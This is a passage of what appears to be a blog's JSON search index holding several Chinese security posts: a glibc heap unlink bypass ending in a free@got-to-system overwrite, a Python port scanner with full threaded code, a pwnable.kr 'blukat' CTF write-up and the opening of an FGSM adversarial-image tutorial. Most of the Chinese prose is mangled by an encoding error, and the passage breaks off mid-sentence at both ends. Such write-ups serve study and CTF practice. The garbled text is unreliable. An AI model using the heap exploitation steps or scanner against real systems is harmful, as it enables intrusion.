æ—¶åº”è·³è¿‡è¿™ 4 ä¸ªå­—èŠ‚ã€‚ å¯¹æŠ—æŠ€æœ¯Double Freeæ£€æµ‹è¯¥æœºåˆ¶ä¸å…è®¸é‡Šæ”¾ä¸€ä¸ªå·²ç»å¤„äºfreeçŠ¶æ€çš„chunkã€‚å› æ­¤ï¼Œå½“æ”»å‡»è€…å°†second chunkçš„sizeè®¾ç½®ä¸º-4çš„æ—¶å€™ï¼Œå°±æ„å‘³ç€è¯¥sizeçš„PREV_INUSEä½ä¸º0ï¼Œä¹Ÿå°±æ˜¯è¯´second chunkä¹‹å‰çš„first chunk(æˆ‘ä»¬éœ€è¦freeçš„chunk)å·²ç»å¤„äºfreeçŠ¶æ€ï¼Œé‚£ä¹ˆè¿™æ—¶å€™å†free(first)çš„è¯ï¼Œå°±ä¼šæŠ¥å‡ºdouble freeé”™è¯¯ã€‚ç›¸å…³ä»£ç å¦‚ä¸‹ï¼š 1234567#!c/* Or whether the block is actually not marked used. */ if (__glibc_unlikely (!prev_inuse(nextchunk))) &#123; errstr = &quot;double free or corruption (!prev)&quot;; goto errout; &#125; next sizeéæ³•æ£€æµ‹è¯¥æœºåˆ¶æ£€æµ‹next sizeæ˜¯å¦åœ¨8åˆ°å½“å‰arenaçš„æ•´ä¸ªç³»ç»Ÿå†…å­˜å¤§å°ä¹‹é—´ã€‚å› æ­¤å½“æ£€æµ‹åˆ°next sizeä¸º-4çš„æ—¶å€™ï¼Œå°±ä¼šæŠ¥å‡ºinvalid next sizeé”™è¯¯ã€‚ç›¸å…³ä»£ç å¦‚ä¸‹ï¼š 1234567#!cnextsize = chunksize(nextchunk);if (__builtin_expect (nextchunk-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0))&#123; errstr = &quot;free(): invalid next size (normal)&quot;; goto errout;&#125; åŒé“¾è¡¨å†²çªæ£€æµ‹è¯¥æœºåˆ¶ä¼šåœ¨æ‰§è¡Œunlinkæ“ä½œçš„æ—¶å€™æ£€æµ‹é“¾è¡¨ä¸­å‰ä¸€ä¸ªchunkçš„fdä¸åä¸€ä¸ªchunkçš„bkæ˜¯å¦éƒ½æŒ‡å‘å½“å‰éœ€è¦unlinkçš„chunkã€‚è¿™æ ·æ”»å‡»è€…å°±æ— æ³•æ›¿æ¢second chunkçš„fdä¸fdäº†ã€‚ç›¸å…³ä»£ç å¦‚ä¸‹ï¼š 123#!cif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P); \\ ä½†è®°ä½ï¼Œå³ä½¿ç”±ä¸Šè¿°ä¸‰ç§æ£€æµ‹æ–¹å¼å¹¶ä¸æ„å‘³ç€unlinkæŠ€æœ¯éƒ½ä¼šå¤±æ•ˆï¼Œæ”»é˜²æ˜¯ä¸€ä¸ªæ­¤æ¶ˆå½¼é•¿çš„è¿‡ç¨‹ï¼Œä¾‹å¦‚ä¸‹é¢ä»‹ç»ä¸€ç§ç»•è¿‡å®‰å…¨æ£€éªŒçš„æ–¹æ³•ï¼ˆæ³¨æ„å…·ä½“æƒ…å†µå…·ä½“åˆ†æï¼‰ã€‚ ç»•è¿‡å®‰å…¨æ ¡éªŒé¦–å…ˆï¼Œéœ€è¦äº†è§£ glibc ä¸­ unlink çš„æ ¡éªŒæœºåˆ¶ã€‚ä»¥ä¸‹ä¸º glibc-2.19 ä¸­ unlink å®çš„éƒ¨åˆ†ä»£ç ï¼Œåœ¨åˆ é™¤ P èŠ‚ç‚¹ä¹‹å‰ä¼šæ£€æŸ¥ FD-&gt;bk != P || BK-&gt;fd != P æ˜¯å¦æˆç«‹ï¼Œå³æ£€æŸ¥å½“å‰ chunk å‰ä¸€ä¸ª chunk çš„ bk ä¸åä¸€ä¸ª chunk çš„ fd æ˜¯å¦æŒ‡å‘å½“å‰ chunkã€‚è‹¥å½“å‰ chunk çš„ fd å’Œ bk è¢«ä¿®æ”¹åˆ™æ— æ³•é€šè¿‡è¿™é¡¹æ£€æŸ¥ï¼ŒFD-&gt;bk = BK ä¸ BK-&gt;fd = FD ä¸ä¼šæ‰§è¡Œï¼Œå¯¼è‡´ unlink æ”»å‡»ä¸èƒ½è¿›è¡Œã€‚ 123456789101112/* Take a chunk off a bin list */#define unlink(P, BK, FD) &#123; \\ FD = P-&gt;fd; \\ BK = P-&gt;bk; \\ if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P); \\ else &#123; \\ FD-&gt;bk = BK; \\ BK-&gt;fd = FD; \\ ... &#125; \\&#125; ä¸ºäº†ç»•è¿‡ä»¥ä¸ŠæŒ‡é’ˆæ ¡éªŒï¼Œéœ€è¦ä»¥ä¸‹æ¡ä»¶ï¼š aï¼‰ ç¨‹åºä¸­å­˜åœ¨ä¸€ä¸ªå…¨å±€æŒ‡é’ˆå˜é‡ ptr bï¼‰ ptr æŒ‡å‘çš„å †å†…å­˜å¯ç”±ç”¨æˆ·æ§åˆ¶ è‹¥å…·å¤‡ä»¥ä¸Šæ¡ä»¶ï¼Œæ”»å‡»è€…å¯åœ¨æŒ‡é’ˆ ptr æŒ‡å‘çš„å†…å­˜ä¸­ä¼ªé€ ä¸€ä¸ªç©ºé—² chunk Pï¼Œæ ¹æ® ptr æ„é€ åˆé€‚çš„åœ°å€è¦†ç›– chunk P çš„ fd å’Œ bkï¼Œä½¿å¾— FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P æˆç«‹ã€‚å…·ä½“å¦‚ä¸‹ï¼š 12P-&gt;fd = ptr - 0xCP-&gt;bk = ptr - 0x8 åœ¨æ‰§è¡Œ unlinkï¼ˆPï¼‰æ—¶çš„æŒ‡é’ˆæ“ä½œå¦‚ä¸‹ï¼š 1234561ï¼‰FD = P-&gt;fd = ptr - 0xC;2ï¼‰BK = P-&gt;bk = ptr - 0x8;// FD-&gt;bk = ptr - 0xC + 0xC = ptr; BK-&gt;fd = ptr -0x8 + 0x8 = ptr// ç”±äº ptr æŒ‡å‘ P,å¯æˆåŠŸç»•è¿‡æŒ‡é’ˆæ ¡éªŒ3ï¼‰FD-&gt;bk = BKï¼Œå³ *ptr = ptr - 0x8;4ï¼‰BK-&gt;fd = FDï¼Œå³ *ptr = ptr - 0xCã€‚ ç”±ä»¥ä¸Šè¿‡ç¨‹å¯çŸ¥ï¼Œå€ŸåŠ©æŒ‡å‘ chunk P çš„ ptr æŒ‡é’ˆå¯ç»•è¿‡ â€œcorrupted double-linked listâ€ å®‰å…¨æœºåˆ¶ï¼Œå¹¶é€šè¿‡ unlink æ”»å‡»å®ç°å†™å†…å­˜ï¼Œæœ€ç»ˆä½¿å¾— ptr æŒ‡å‘ ptr - 0xcã€‚ unlink åï¼Œå¯¹ ptr æŒ‡å‘çš„å†…å­˜è¿›è¡Œå†™å…¥ï¼Œå¦‚ â€˜Aâ€™*0xC + free@gotï¼Œä½¿å¾— ptr æŒ‡å‘ free@gotï¼Œå†æ¬¡å¯¹ ptr æŒ‡å‘çš„å†…å­˜è¿›è¡Œå†™å…¥ï¼Œå¯ä»¥æŠŠ free@got ä¿®æ”¹ä¸º system çš„åœ°å€ï¼Œä¹‹åè°ƒç”¨ free å¯ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Heap","slug":"PWN/Heap","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/"},{"name":"Heap_Attack","slug":"PWN/Heap/Heap-Attack","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/Heap-Attack/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"pythonå®ç°ç«¯å£æ‰«æå™¨","slug":"Python/pythonå®ç°ç«¯å£æ‰«æå™¨","date":"2020-10-24T00:19:51.000Z","updated":"2020-10-25T01:50:40.000Z","comments":true,"path":"2020/10/24/Python/pythonå®ç°ç«¯å£æ‰«æå™¨/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/","excerpt":"","text":"å®ç°åŸç†æœ€ç®€å•çš„ç«¯å£æ‰«æå·¥å…·ä½¿ç”¨TCPè¿æ¥æ‰«æçš„æ–¹å¼ï¼Œå³åˆ©ç”¨æ“ä½œç³»ç»ŸåŸç”Ÿçš„ç½‘ç»œåŠŸèƒ½ï¼Œä¸”é€šå¸¸ä½œä¸ºSYNæ‰«æçš„æ›¿ä»£é€‰é¡¹ã€‚Nmapå°†è¿™ç§æ¨¡å¼ç§°ä¸ºè¿æ¥æ‰«æï¼Œå› ä¸ºä½¿ç”¨äº†ç±»ä¼¼Unixç³»ç»Ÿçš„connect()å‘½ä»¤ã€‚å¦‚æœè¯¥ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œæ“ä½œç³»ç»Ÿå°±èƒ½å®ŒæˆTCPä¸‰æ¬¡æ¡æ‰‹ï¼Œç„¶åç«¯å£æ‰«æå·¥å…·ä¼šç«‹å³å…³é—­åˆšå»ºç«‹çš„è¿æ¥ï¼Œé˜²æ­¢æ‹’ç»æœåŠ¡æ”»å‡»ã€‚è¿™ç§ç«¯å£æ‰«ææ¨¡å¼çš„ä¼˜åŠ¿æ˜¯ç”¨æˆ·æ— éœ€ç‰¹æ®Šæƒé™ã€‚ä½†ä½¿ç”¨æ“ä½œç³»ç»ŸåŸç”Ÿç½‘ç»œåŠŸèƒ½ä¸èƒ½å®ç°åº•å±‚æ§åˆ¶ï¼Œå› æ­¤è¿™ç§æ‰«ææ–¹å¼å¹¶ä¸æµè¡Œã€‚å¹¶ä¸”TCPæ‰«æå¾ˆå®¹æ˜“è¢«å‘ç°ï¼Œå°¤å…¶ä½œä¸ºç«¯å£æ¸…æ‰«çš„æ‰‹æ®µï¼šè¿™äº›æœåŠ¡ä¼šè®°å½•å‘é€è€…çš„ IP åœ°å€ï¼Œå…¥ä¾µæ£€æµ‹ç³»ç»Ÿå¯èƒ½è§¦å‘è­¦æŠ¥ã€‚$â€“&gt;$ï¼ˆç«¯å£æ‰«æç±»å‹ï¼‰ è¿˜æœ‰å¦å¤–ä¸€ç§æ‰«ææ–¹å¼æ˜¯ SYN æ‰«æï¼Œç«¯å£æ‰«æå·¥å…·ä¸ä½¿ç”¨æ“ä½œç³»ç»ŸåŸç”Ÿç½‘ç»œåŠŸèƒ½ï¼Œè€Œæ˜¯è‡ªè¡Œç”Ÿæˆã€å‘é€ IP æ•°æ®åŒ…ï¼Œå¹¶ç›‘æ§å…¶å›åº”ã€‚è¿™ç§æ‰«ææ¨¡å¼è¢«ç§°ä¸º â€œåŠå¼€æ”¾æ‰«æâ€ï¼Œå› ä¸ºå®ƒä»ä¸å»ºç«‹å®Œæ•´çš„ TCP è¿æ¥ã€‚ç«¯å£æ‰«æå·¥å…·ç”Ÿæˆä¸€ä¸ª SYN åŒ…ï¼Œå¦‚æœç›®æ ‡ç«¯å£å¼€æ”¾ï¼Œåˆ™ä¼šè¿”å› SYN-ACK åŒ…ã€‚æ‰«æç«¯å›åº”ä¸€ä¸ª RST åŒ…ï¼Œç„¶ååœ¨æ¡æ‰‹å®Œæˆå‰å…³é—­è¿æ¥ã€‚å¦‚æœç«¯å£å…³é—­äº†ä½†æœªä½¿ç”¨è¿‡æ»¤ï¼Œç›®æ ‡ç«¯å£åº”è¯¥ä¼šæŒç»­è¿”å› RST åŒ…ã€‚è¿™ç§ç²—ç•¥çš„ç½‘ç»œåˆ©ç”¨æ–¹å¼æœ‰å‡ ä¸ªä¼˜ç‚¹ï¼šç»™æ‰«æå·¥å…·å…¨æƒæ§åˆ¶æ•°æ®åŒ…å‘é€å’Œç­‰å¾…å›åº”æ—¶é•¿çš„æƒåŠ›ï¼Œå…è®¸æ›´è¯¦ç»†çš„å›åº”åˆ†æã€‚å…³äºå“ªä¸€ç§å¯¹ç›®æ ‡ä¸»æœºçš„æ‰«ææ–¹å¼æ›´ä¸å…·å¤‡å…¥ä¾µæ€§å­˜åœ¨ä¸€äº›äº‰è®®ï¼Œä½† SYN æ‰«æçš„ä¼˜åŠ¿æ˜¯ä»ä¸ä¼šå»ºç«‹å®Œæ•´çš„è¿æ¥ã€‚ç„¶è€Œï¼ŒRST åŒ…å¯èƒ½å¯¼è‡´ç½‘ç»œå µå¡ï¼Œå°¤å…¶æ˜¯ä¸€äº›ç®€å•å¦‚æ‰“å°æœºä¹‹ç±»çš„ç½‘ç»œè®¾å¤‡ã€‚ å®ä¾‹ä¸­é‡‡ç”¨çš„æ˜¯ç¬¬ä¸€ç§æ‰«ææ–¹å¼ï¼Œç›´æ¥åˆ©ç”¨æ“ä½œç³»ç»Ÿçš„ socket è¿æ¥æ¥å£ï¼Œåˆæ­¥æµ‹è¯•ç›®æ ‡æœåŠ¡å™¨çš„ç«¯å£æ˜¯å¦å¯ä»¥è¿æ¥ï¼Œå¦‚æœå¯ä»¥åˆ™è¿”å›ç«¯å£æ‰“å¼€çŠ¶æ€ã€‚$â€“&gt;$ï¼ˆsocketç¼–ç¨‹åŸºç¡€ï¼‰ å®ç°å•çº¿ç¨‹æ‰«æåŠŸèƒ½12345678910111213141516171819202122232425262728import sysfrom socket import *# å®ç°ä»ç¨‹åºå¤–éƒ¨å‘ç¨‹åºä¼ é€’å‚æ•°host = sys.argv[1]portstrs = sys.argv[2].split(&#x27;-&#x27;)# æ‰«æç«¯å£èŒƒå›´start_port = int(portstrs[0])end_port = int(portstrs[1])# è·å–ç›®æ ‡ipåœ°å€target_ip = gethostbyname(host)opened_ports = []# è¿›è¡Œå¾ªç¯è¿æ¥for port in range(start_port, end_port): sock = socket(AF_INET, SOCK_STREAM) sock.settimeout(10) result = sock.connect_ex((target_ip, port)) if result == 0: opened_ports.append(port)# æ‰“å°å¼€æ”¾çš„ç«¯å£print(&quot;Opened ports:&quot;)for i in opened_ports: print(i) ä¸Šé¢ä»£ç å®ç°äº†å•çº¿ç¨‹æ‰«æç«¯å£çš„æµ‹è¯•ï¼Œä½†æ˜¯æ­£å¸¸çš„ç¨‹åºåœ¨æ‰§è¡Œä¸­æˆ‘ä»¬éœ€è¦è€ƒè™‘æ‰§è¡Œæ•ˆç‡å’Œæå‡æ€§èƒ½ï¼Œæ‰€ä»¥éœ€è¦å®ç°å¤šçº¿ç¨‹ç¨‹åºã€‚ å¤šçº¿ç¨‹æ‰«æ123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475import timeimport socketfrom gevent import monkeymonkey.patch_all()import geventimport gevent.pooldef TCP_connect(ip, port): &quot;&quot;&quot;æ¨¡æ‹ŸTCPè¿æ¥&quot;&quot;&quot; TCP_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) TCP_sock.settimeout(0.5) # è®¾ç½®è¿æ¥è¶…æ—¶ try: result = TCP_sock.connect_ex((ip, int(port))) if result == 0: print(&quot;[*]%s ç«¯å£ å¼€å¯\\t&quot; % port) else: # print(&quot;[!]%sç«¯å£ å…³é—­&quot;%port) pass TCP_sock.close() except socket.error as e: print(&quot;[!]é”™è¯¯:&quot;, e)def scan_ip(): &quot;&quot;&quot;æ‰«æç›®æ ‡IP&quot;&quot;&quot; ip = input(&quot;[+]è¾“å…¥æ‰«æç›®æ ‡IP:&quot;) print(&quot;[*]æ­£åœ¨æ‰«æ&quot;) scan_port(ip)def scan_web(): &quot;&quot;&quot;æ‰«æç›®æ ‡ç½‘å€&quot;&quot;&quot; web = input(&quot;[+]è¾“å…¥æ‰«æç½‘å€:&quot;) if &quot;http://&quot; in web or &quot;https://&quot; in web: web = web[web.find(&#x27;://&#x27;) + 3:] print(web) print(&quot;[*]æ­£åœ¨åˆ†æç½‘ç«™æœåŠ¡å™¨IP&quot;) try: server_ip = socket.gethostbyname(str(web)) print(&quot;[*]æœåŠ¡å™¨IPä¸º%s&quot; % server_ip) scan_port(server_ip) except Exception as e: print(&quot;[!]æœåŠ¡å™¨IPè·å–å¤±è´¥&quot;) passdef scan_port(ip): &quot;&quot;&quot;æ‰«æç«¯å£&quot;&quot;&quot; print(&quot;[*]å¼€å§‹æ‰«æç›®æ ‡ç«¯å£&quot;) start = time.time() g = gevent.pool.Pool(50) # è®¾ç½®çº¿ç¨‹æ•° run_list = [] for port in range(1, 65535): run_list.append(g.spawn(TCP_connect, ip, port)) gevent.joinall(run_list) end = time.time() print(&quot;[*]æ€»è€—æ—¶%s&quot; % time.strftime(&quot;%H:%M:%S&quot;, time.gmtime(end - start)))def main(): print(&quot;1.é€šè¿‡IPæ‰«æç«¯å£&quot;) print(&quot;2.é€šè¿‡ç½‘å€æ‰«æç«¯å£&quot;) uc = int(input(&quot;[+]è¯·è¾“å…¥é€‰æ‹©:&quot;)) if 1 == uc: scan_ip() elif 2 == uc: scan_web() else: print(&quot;[!]è¾“å…¥æœ‰è¯¯&quot;)if __name__ == &quot;__main__&quot;: main() è¿™é‡Œå±•ç¤ºéƒ¨åˆ†è¿è¡Œç»“æœï¼š é€‰æ‹©é€šè¿‡ç½‘å€æ‰«æç«¯å£ é€‰æ‹©é€šè¿‡IPæ‰«æç«¯å£ ä½¿ç”¨nmapæ‰«æ12345678910import nmaphost = &#x27;192.168.56.1&#x27;# æŠŠnmap.exeçš„è·¯å¾„æ”¾å…¥PortScannerä¸­ï¼Œå¦åˆ™ä¼šæœ‰ç¯å¢ƒå˜é‡é”™è¯¯nm = nmap.PortScanner(nmap_search_path=(&#x27;nmap&#x27;, r&quot;E:\\nmap\\nmap.exe&quot;))for port in range(130, 136): result = nm.scan(host, str(port)) # åœ¨ä¸»æœº192.168.56.1ä¸Šè·å–ç«¯å£22/tcpçŠ¶æ€ state = result[&#x27;scan&#x27;][&#x27;192.168.56.1&#x27;][&#x27;tcp&#x27;][int(port)][&#x27;state&#x27;] print(&#x27;[%s] port state: %s&#x27; % (port, state)) ä½¿ç”¨netstat -anæŸ¥çœ‹æœ¬æœºå¼€å¯çš„ç«¯å£æœåŠ¡ï¼Œç”¨ç«¯å£135æµ‹è¯•ä»£ç è¿è¡Œçš„æ­£ç¡®æ€§ ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨zenmapå·¥å…·è¿›è¡Œç«¯å£æ‰«æï¼š","categories":[{"name":"Python","slug":"Python","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Python/"},{"name":"Web","slug":"Python/Web","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/Python/Web/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Python/"},{"name":"Nmap","slug":"Nmap","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/Nmap/"}]},{"title":"blukat","slug":"Pwnable_kr/blukat","date":"2020-10-22T14:01:47.000Z","updated":"2020-10-23T00:13:38.000Z","comments":true,"path":"2020/10/22/Pwnable_kr/blukat/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/22/Pwnable_kr/blukat/","excerpt":"","text":"æŸ¥çœ‹blukat.cæºæ–‡ä»¶123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;char flag[100];char password[100];char* key = &quot;3\\rG[S/%\\x1c\\x1d#0?\\rIS\\x0f\\x1c\\x1d\\x18;,4\\x1b\\x00\\x1bp;5\\x0b\\x1b\\x08\\x45+&quot;;void calc_flag(char* s)&#123; int i; for(i=0; i&lt;strlen(s); i++)&#123; flag[i] = s[i] ^ key[i]; &#125; printf(&quot;%s\\n&quot;, flag);&#125;int main()&#123; FILE* fp = fopen(&quot;/home/blukat/password&quot;, &quot;r&quot;); fgets(password, 100, fp); char buf[100]; printf(&quot;guess the password!\\n&quot;); fgets(buf, 128, stdin); if(!strcmp(password, buf))&#123; printf(&quot;congrats! here is your flag: &quot;); calc_flag(password); &#125; else&#123; printf(&quot;wrong guess!\\n&quot;); exit(0); &#125; return 0;&#125; ç¨‹åºå…ˆè¯»å–passwordæ–‡ä»¶ä¸­çš„å†…å®¹åˆ°passwordæ•°ç»„ä¸­ï¼Œä¹‹åä½¿ç”¨bufç¼“å†²åŒºè¯»å–ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ï¼Œbufç¼“å†²åŒºçš„å¤§å°ä¸º100ï¼Œè€Œè¯»å–çš„å­—ç¬¦ä¸º128ï¼Œä¹‹åæ¯”è¾ƒç”¨æˆ·è¾“å…¥çš„å­—ç¬¦å’Œpasswordæ•°ç»„ä¸­çš„å†…å®¹ï¼Œå¦‚æœç›¸ç­‰ï¼Œåˆ™å¯ä»¥æ‰§è¡Œcacl_flagå‡½æ•°ï¼Œç»è¿‡å’Œå¯†é’¥çš„å¼‚æˆ–è¿ç®—è®¡ç®—å‡ºflagã€‚å¦‚æœé‡‡ç”¨ç¼“å†²åŒºæº¢å‡ºè¦†ç›–fgetsçš„è¿”å›åœ°å€ä¸ºå‡½æ•°calc_flagçš„åœ°å€ï¼Œç”±äºä¸çŸ¥é“passwordçš„å†…å®¹ï¼Œæ— æ³•æ­£ç¡®è®¡ç®—å‡ºflagï¼Œå› æ­¤è¿™é‡Œç¼“å†²åŒºæº¢å‡ºæ”»å‡»è¡Œä¸é€šã€‚ PWNæƒ³åˆ°æœ¬é¢˜é¢˜å¹²ä¸­çš„æè¿°ï¼Œæœ¬é¢˜åº”è¯¥æ˜¯å…·æœ‰ä¸€ç§å·§å¦™çš„è§£æ³•ï¼ˆls-laå„é¡¹è¯´æ˜â€‹ï¼‰ã€‚ è¿™é‡Œçœ‹åˆ°passwordæ–‡ä»¶çš„ç”¨æˆ·ç»„å«æœ‰blukat_pwnï¼Œè€Œå½“å‰ç”¨æˆ·åœ¨blukat_pwnç»„ï¼Œå› æ­¤æ˜¯å…·æœ‰è¯»æƒé™çš„ï¼Œé‚£è¿è¡Œcatå‘½ä»¤ï¼š æç¤ºæ²¡æœ‰è®¿é—®æƒé™ï¼Ÿä¸ï¼Œè¿™é‡Œçš„æ–‡ä»¶å†…å®¹å°±æ˜¯è¿™å¥è¯ï¼Œé‚£ç›´æ¥å°†è¿™å¥è¯è¾“å…¥åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­å³å¯æ‹¿åˆ°flagã€‚","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"é˜…è¯»æ·±åº¦å­¦ä¹ çš„å¯¹æŠ—æ”»å‡»æ–¹æ³•ç»¼è¿°åŠå®ä¾‹","slug":"AIå®‰å…¨/é˜…è¯»æ·±åº¦å­¦ä¹ çš„å¯¹æŠ—æ”»å‡»æ–¹æ³•ç»¼è¿°åŠå®ä¾‹","date":"2020-10-22T07:24:07.000Z","updated":"2020-10-24T02:40:26.000Z","comments":true,"path":"2020/10/22/AIå®‰å…¨/é˜…è¯»æ·±åº¦å­¦ä¹ çš„å¯¹æŠ—æ”»å‡»æ–¹æ³•ç»¼è¿°åŠå®ä¾‹/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/22/AI%E5%AE%89%E5%85%A8/%E9%98%85%E8%AF%BB%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E7%BB%BC%E8%BF%B0%E5%8F%8A%E5%AE%9E%E4%BE%8B/","excerpt":"","text":"å¯¹æŠ—æ ·æœ¬æ”»å‡»å¤§ä½“åŸç†å¦‚ä¸‹ï¼š ä»€ä¹ˆæ˜¯å¯¹æŠ—æ€§ä¾‹å­ï¼Ÿå¯¹æŠ—æ€§ç¤ºä¾‹æ˜¯ä¸“é—¨åˆ›å»ºçš„è¾“å…¥ï¼Œå…¶ç›®çš„æ˜¯æ··æ·†ç¥ç»ç½‘ç»œï¼Œä»è€Œå¯¼è‡´ç»™å®šè¾“å…¥çš„åˆ†ç±»é”™è¯¯ã€‚è¿™äº›è‡­åæ˜­è‘—çš„è¾“å…¥å¯¹äºäººçœ¼æ˜¯æ— æ³•åŒºåˆ†çš„ï¼Œä½†æ˜¯ä¼šå¯¼è‡´ç½‘ç»œæ— æ³•è¯†åˆ«å›¾åƒçš„å†…å®¹ã€‚è¿™ç±»æ”»å‡»æœ‰å‡ ç§ç±»å‹ï¼Œä½†æ˜¯ï¼Œè¿™é‡Œçš„é‡ç‚¹æ˜¯å¿«é€Ÿæ¢¯åº¦ç¬¦å·æ–¹æ³•æ”»å‡»ï¼Œè¿™æ˜¯ä¸€ç§ç™½ç›’æ”»å‡»ï¼Œå…¶ç›®çš„æ˜¯ç¡®ä¿é”™è¯¯åˆ†ç±»ã€‚ç™½ç›’æ”»å‡»æ˜¯æ”»å‡»è€…å¯ä»¥å®Œå…¨è®¿é—®è¢«æ”»å‡»æ¨¡å‹çš„åœ°æ–¹ã€‚ä¸¾ä¸‹é¢ä¸¤ä¸ªä¾‹å­ï¼š åŸå§‹å›¾åƒï¼ˆå·¦å›¾ï¼‰ï¼Œå¯¹æŠ—å™ªå£°ï¼ˆä¸­å›¾ï¼‰ï¼Œæ‰°åŠ¨åçš„å›¾ç‰‡å³å¯¹æŠ—æ ·æœ¬ï¼ˆå³å›¾ï¼‰è¢«é”™è¯¯åœ°åˆ†ç±»ä¸ºæ•°å­— 2ã€‚ åœ¨è¿™é‡Œï¼Œä»ç†ŠçŒ«çš„å›¾åƒå¼€å§‹ï¼Œæ”»å‡»è€…å‘åŸå§‹å›¾åƒæ·»åŠ äº†è¾ƒå°çš„æ‰°åŠ¨ï¼ˆå¤±çœŸï¼‰ï¼Œè¿™å¯¼è‡´æ¨¡å‹ä»¥è¾ƒé«˜çš„ç½®ä¿¡åº¦å°†è¯¥å›¾åƒæ ‡è®°ä¸ºé•¿è‡‚çŒ¿ã€‚ä¸‹é¢è¯´æ˜æ·»åŠ è¿™äº›æ‰°åŠ¨çš„è¿‡ç¨‹ã€‚ å¿«é€Ÿæ¢¯åº¦ç¬¦å·æ³•(FGSM) ä¸‹é¢å±•ç¤ºç®€å•çš„åˆ©ç”¨FGSMåŸç†å®ç°çš„ç¤ºä¾‹ã€‚ FGSMçš„å·¥ä½œåŸç†æ˜¯åˆ©ç”¨ç¥ç»ç½‘ç»œçš„æ¢¯åº¦æ¥åˆ›å»ºä¸€ä¸ªAdversarial exampleã€‚å¯¹äºè¾“å…¥å›¾åƒï¼Œè¯¥æ–¹æ³•ä½¿ç”¨ç›¸å¯¹äºè¾“å…¥å›¾åƒçš„æŸå¤±çš„æ¢¯åº¦æ¥åˆ›å»ºä½¿æŸå¤±å‡½æ•°æœ€å¤§åŒ–çš„æ–°å›¾åƒã€‚è¿™ä¸ªæ–°å›¾åƒè¢«ç§°ä¸ºå¯¹æŠ—å›¾åƒã€‚ åœ¨è¿™é‡Œï¼Œæ¢¯åº¦æ˜¯ç›¸å¯¹äºè¾“å…¥çš„å›¾åƒçš„ã€‚è¿™æ ·åšæ˜¯å› ä¸ºå…¶ç›®æ ‡æ˜¯åˆ›é€ ä¸€ä¸ªæœ€å¤§åŒ–æŸå¤±çš„å›¾åƒã€‚å®ç°è¿™ä¸€ç‚¹çš„æ–¹æ³•æ˜¯æ‰¾å‡ºå›¾åƒä¸­æ¯ä¸ªåƒç´ å¯¹æŸå¤±å€¼çš„è´¡çŒ®ç¨‹åº¦ï¼Œå¹¶ç›¸åº”åœ°æ·»åŠ ä¸€ä¸ªæ‰°åŠ¨ï¼ˆä½¿ç”¨é“¾å¼è§„åˆ™å»è®¡ç®—æ¢¯åº¦å¯ä»¥å¾ˆå®¹æ˜“åœ°æ‰¾åˆ°æ¯ä¸ªè¾“å…¥åƒç´ çš„è´¡çŒ®ç¨‹åº¦ï¼‰ã€‚æ­¤å¤–ï¼Œç”±äºæ¨¡å‹ä¸å†è¢«è®­ç»ƒï¼ˆå› æ­¤æ¢¯åº¦ä¸é’ˆå¯¹å¯è®­ç»ƒå˜é‡ï¼Œå³æ¨¡å‹å‚æ•°ï¼‰ï¼Œå› æ­¤æ¨¡å‹å‚æ•°ä¿æŒä¸å˜ã€‚å”¯ä¸€çš„ç›®çš„å°±æ˜¯ä½¿ä¸€ä¸ªå·²ç»å—è¿‡è®­ç»ƒçš„æ¨¡å‹å‘ç”Ÿé”™è¯¯çš„åˆ†ç±»ã€‚åœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæ¨¡å‹æ˜¯MobileNetV2æ¨¡å‹ï¼Œåœ¨ImageNetä¸Šè¿›è¡Œäº†é¢„è®­ç»ƒã€‚ å¯¼å…¥æ‰€éœ€è¦çš„åº“123import tensorflow as tfimport matplotlib as mplimport matplotlib.pyplot as plt è®¾ç½®å›¾ç‰‡ç›¸å…³ä¿¡æ¯1234# å›¾ç‰‡åƒç´ 